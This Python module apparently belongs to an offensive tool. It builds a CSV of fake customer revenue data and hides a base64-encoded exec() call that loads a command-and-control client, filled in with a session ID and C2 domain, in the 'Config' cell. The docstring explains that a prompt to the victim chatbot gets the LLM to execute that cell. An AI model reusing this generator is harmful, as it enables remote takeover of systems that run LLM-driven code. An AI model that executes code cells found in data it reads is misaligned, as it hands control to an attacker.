"""CSV payload generator for prompt injection attacks."""

import base64
import csv
import io
import uuid
from pathlib import Path
from typing import Optional


def load_payload_template() -> str:
    """Load the minified payload client template."""
    template_path = Path(__file__).parent.parent / "payload" / "client_mini.py"
    if not template_path.exists():
        raise FileNotFoundError(f"Payload template not found at {template_path}")

    with open(template_path, "r") as f:
        return f.read()


def generate_session_id() -> str:
    """Generate a unique session ID."""
    return f"sess_{uuid.uuid4().hex[:8]}"


def create_payload(session_id: str, c2_domain: str) -> str:
    """
    Create the payload code with injected session ID and C2 domain.

    Args:
        session_id: Unique session identifier
        c2_domain: C2 server domain

    Returns:
        The payload Python code as a string
    """
    template = load_payload_template()

    payload = template.replace("__SESSION_ID_PLACEHOLDER__", session_id)
    payload = payload.replace("__C2_DOMAIN_PLACEHOLDER__", c2_domain)

    return payload


def generate_malicious_csv(
    c2_domain: str,
    session_id: Optional[str] = None,
    output_path: str = "malicious_data.csv",
) -> dict:
    """
    Generate a CSV file with an embedded C2 payload.

    The CSV has a "Config" column where one cell contains the base64-encoded
    C2 client as a Python exec() call. The user's prompt (typed into the
    victim chatbot's web UI) directs the LLM to execute it.

    This approach is reliable because the LLM never has to reproduce the
    payload — it just reads the cell and runs it via exec(rows[N][M]).

    Args:
        c2_domain: C2 server domain
        session_id: Session ID (auto-generated if None)
        output_path: Path to write the CSV file

    Returns:
        Dict with session_id, output_path, and other info
    """
    if session_id is None:
        session_id = generate_session_id()

    payload = create_payload(session_id, c2_domain)
    encoded_payload = base64.b64encode(payload.encode()).decode()

    exec_line = f"import base64;exec(base64.b64decode('{encoded_payload}').decode())"

    headers = ["Customer", "Revenue", "Region", "Config"]
    data = [
        ["Acme Corp", "125000", "West", exec_line],
        ["Globex Inc", "89500", "East", ""],
        ["Initech", "45200", "South", ""],
        ["Umbrella Corp", "230000", "North", ""],
        ["Stark Industries", "500000", "West", ""],
    ]

    output = io.StringIO()
    writer = csv.writer(output, quoting=csv.QUOTE_ALL)
    writer.writerow(headers)
    writer.writerows(data)

    with open(output_path, "w", newline="") as f:
        f.write(output.getvalue())

    return {
        "session_id": session_id,
        "output_path": output_path,
        "c2_domain": c2_domain,
        "payload_cell": "row 2, Config column (D2)",
    }
